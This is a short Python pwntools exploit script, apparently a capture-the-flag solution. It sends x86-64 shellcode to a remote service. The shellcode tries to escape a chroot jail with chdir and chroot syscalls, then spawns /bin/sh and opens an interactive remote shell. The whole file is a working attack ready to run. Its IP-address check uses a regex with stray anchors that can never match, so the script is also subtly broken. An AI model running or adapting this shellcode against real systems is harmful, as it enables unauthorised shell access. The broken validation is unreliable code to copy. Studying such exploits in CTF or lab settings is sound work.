#!/usr/bin/env python3
from pwn import *
import sys
import re

def exploit(host, port):
    # My teammate saturn already yelled at me for this style. I KNOW...
    shellcode = b"".join([asm(o, arch="amd64", os="linux", bits=64) for o in [
        ## We're in /tmp/something, so double traverse to /.
        "xor rdi, rdi",
        "mov rdi, 0x2E2E", # "..\0"
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "mov rax, 0x50", # chdir() syscall
        "syscall",
        "mov rax, 0x50", # chdir() syscall
        "syscall",
        
        ## Change chroot to the current directory which is /.
        "xor rdi, rdi",
        "mov rdi, 0x2E", # "."
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "mov rax, 0xA1", # chroot() syscall
        "syscall",
        
        ## execve("/bin/sh", ["/bin/sh", null], null);
        "xor rdi, rdi",
        "push rdi",
        "mov rdi, 0x68732F6E69622F2F", # "//bin/sh" - extra slash to pad out the null byte
        "push rdi",
        "mov rdi, rsp",  # use stack pointer as path string
        "xor rsi, rsi",
        "push rsi",
        "push rdi",
        "mov rsi, rsp",  # use stack pointer as argv array
        "xor rdx, rdx",
        "mov rax, 0x3B", # execve() syscall
        "syscall",
    ]])

    sock = remote(host, port)
    sock.recvuntil(b"Which file would you like to open?")
    sock.sendline(b"test")
    sock.recvuntil(b"What would you like me to run next?")
    sock.sendline(shellcode)
    sock.interactive()

def usage():
    print("Usage: %s <host> <port>" % sys.argv[0])
    sys.exit()
    
def main():
    if len(sys.argv) < 3:
        usage()
        
    if not re.match("^\d{1,3}\.^\d{1,3}\.^\d{1,3}\.^\d{1,3}$", sys.argv[1]):
        usage()
        
    try:
        exploit(sys.argv[1], int(sys.argv[2]))
    except:
        usage()

if __name__ == "__main__":
    main()